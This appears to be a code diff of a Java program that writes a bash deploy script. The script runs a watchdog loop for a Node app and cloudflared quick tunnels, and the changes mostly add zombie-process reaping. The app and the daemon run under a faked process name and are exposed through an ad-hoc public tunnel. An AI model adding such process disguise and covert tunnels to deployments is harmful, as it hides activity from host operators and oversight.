+        "                            if [ -n \"$VERIFY2\" ] && [ \"$VERIFY2\" != \"000\" ] && [ \"$VERIFY2\" != \"502\" ]; then\n" +
+        "                                echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                                echo \"PROTOCOL=$PROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                                echo \"CF_PID=$CF_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
+        "                                echo \"$CF_PID\" >> \"$WORK_DIR/.pids\"\n" +
+        "                                TUNNEL_ESTABLISHED=true\n" +
+        "                                SAVED_PROTO=$PROTO\n" +
+        "                                break\n" +
+        "                            fi\n" +
+        "                            # ★ 修复：kill 后必须 wait 回收\n" +
+        "                            kill $CF_PID 2>/dev/null\n" +
+        "                            wait $CF_PID 2>/dev/null\n" +
+        "                            CF_PID=''\n" +
+        "                        fi\n" +
+        "                    fi\n" +
+        "                    sleep 1\n" +
+        "                done\n" +
+        "                if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ] && [ -n \"$CF_PID\" ]; then\n" +
+        "                    # ★ 修复：kill 后必须 wait 回收\n" +
+        "                    kill $CF_PID 2>/dev/null\n" +
+        "                    wait $CF_PID 2>/dev/null\n" +
+        "                    CF_PID=''\n" +
+        "                fi\n" +
+        "            done\n" +
+        "        done\n" +
+        "    fi\n" +
+        "fi\n" +
+        "\n" +
+        "# ============ C. 守护循环 ============\n" +
         "while true; do\n" +
         "    NEED_RESTART=false\n" +
         "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n" +
         "        NEED_RESTART=true\n" +
         "    fi\n" +
         "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
+        "        # ★ 修复：回收旧的 Node 进程僵尸\n" +
+        "        wait $NODE_PID 2>/dev/null\n" +
         "        cd \"$APP_DIR\"\n" +
         "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
         "        (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
@@ -687,10 +952,12 @@ private static Path generateDeployScript() throws Exception {
         "    NEED_REBUILD=false\n" +
         "    if [ -f \"$WORK_DIR/.cf/tunnel_url.txt\" ] && [ \"" + cfMode + "\" != \"fixed\" ]; then\n" +
         "        SAVED_CF_PID=$(grep 'CF_PID=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
-        "        SAVED_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
-        "        SAVED_PROTO=${SAVED_PROTO:-quic}\n" +
+        "        CURRENT_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null | cut -d= -f2)\n" +
+        "        CURRENT_PROTO=${CURRENT_PROTO:-$SAVED_PROTO}\n" +
         "        \n" +
         "        if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n" +
+        "            # ★ 修复：回收已死的 cloudflared 僵尸\n" +
+        "            wait $SAVED_CF_PID 2>/dev/null\n" +
         "            NEED_REBUILD=true\n" +
         "        fi\n" +
         "        \n" +
@@ -709,20 +976,30 @@ private static Path generateDeployScript() throws Exception {
         "        fi\n" +
         "        \n" +
         "        if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
-        "            [ -n \"$SAVED_CF_PID\" ] && kill $SAVED_CF_PID 2>/dev/null\n" +
+        "            # ★ 修复：使用 kill_and_reap 安全杀死并回收旧 cloudflared\n" +
+        "            kill_and_reap \"$SAVED_CF_PID\"\n" +
         "            pkill -f \"$CF_BIN\" 2>/dev/null\n" +
         "            pkill -f 'cloudflared.*tunnel' 2>/dev/null\n" +
         "            sleep 2\n" +
+        "            # ★ 修复：回收所有后台僵尸子进程\n" +
+        "            while wait -n 2>/dev/null; do :; done\n" +
         "            rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
         "            \n" +
-        "            for RPROTO in $SAVED_PROTO quic http2 auto; do\n" +
+        "            CF_PID=''\n" +
+        "            for RPROTO in $CURRENT_PROTO quic http2 auto; do\n" +
         "                rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
         "                NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$WORK_DIR/.cf/cf.log\")\n" +
         "                sleep 5\n" +
-        "                if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
+        "                if ! kill -0 $NEW_PID 2>/dev/null; then\n" +
+        "                    # ★ 修复：回收失败的子进程\n" +
+        "                    wait $NEW_PID 2>/dev/null\n" +
+        "                    continue\n" +
+        "                fi\n" +
         "                NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
         "                if [ -z \"$NEW_URL\" ]; then\n" +
+        "                    # ★ 修复：kill 后必须 wait 回收\n" +
         "                    kill $NEW_PID 2>/dev/null\n" +
+        "                    wait $NEW_PID 2>/dev/null\n" +
         "                    continue\n" +
         "                fi\n" +
         "                sleep 3\n" +
@@ -732,6 +1009,8 @@ private static Path generateDeployScript() throws Exception {
         "                    echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
         "                    echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
         "                    echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
+        "                    CF_PID=$NEW_PID\n" +
+        "                    SAVED_PROTO=$RPROTO\n" +
         "                    break\n" +
         "                else\n" +
         "                    sleep 5\n" +
@@ -741,18 +1020,26 @@ private static Path generateDeployScript() throws Exception {
         "                        echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
         "                        echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
         "                        echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
+        "                        CF_PID=$NEW_PID\n" +
+        "                        SAVED_PROTO=$RPROTO\n" +
         "                        break\n" +
         "                    else\n" +
+        "                        # ★ 修复：kill 后必须 wait 回收\n" +
         "                        kill $NEW_PID 2>/dev/null\n" +
+        "                        wait $NEW_PID 2>/dev/null\n" +
         "                    fi\n" +
         "                fi\n" +
         "            done\n" +
         "        fi\n" +
         "    fi\n" +
+        "    \n" +
+        "    # ★ 修复：每轮循环末尾主动回收所有已退出的子进程\n" +
+        "    while wait -n 2>/dev/null; do :; done\n" +
         "    sleep 15\n" +
         "done\n" +
         "DAEMONSCRIPT\n" +
         "chmod +x daemon.sh\n" +
+        "# ★ 启动 daemon.sh：它是所有运行时子进程的父进程\n" +
         "(exec -a \"" + FAKE_CMD + "\" bash ./daemon.sh >> daemon.log 2>&1) &\n" +
         "echo \"$!\" >> .pids\n";
 
@@ -763,7 +1050,7 @@ private static Path generateDeployScript() throws Exception {
 }
 
 // ============================================================
-// 执行部署脚本
+// 执行部署脚本（★ 修复版）
 // ============================================================
 
 private static void executeDeployScript(Path script) throws Exception {
@@ -772,6 +1059,7 @@ private static void executeDeployScript(Path script) throws Exception {
     pb.redirectErrorStream(true);
     pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
     Process p = pb.start();
+    
     Thread t = new Thread(() -> {
         try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
             while (r.readLine() != null) {}
@@ -779,7 +1067,12 @@ private static void executeDeployScript(Path script) throws Exception {
     }, "Deploy-Log");
     t.setDaemon(true);
     t.start();
-    if (!p.waitFor(10, TimeUnit.MINUTES)) { p.destroyForcibly(); }
+    
+    // ★ 修复：超时后必须 destroyForcibly + waitFor 确保进程被回收
+    if (!p.waitFor(10, TimeUnit.MINUTES)) {
+        p.destroyForcibly();
+        p.waitFor(30, TimeUnit.SECONDS);
+    }
 }
 
 }
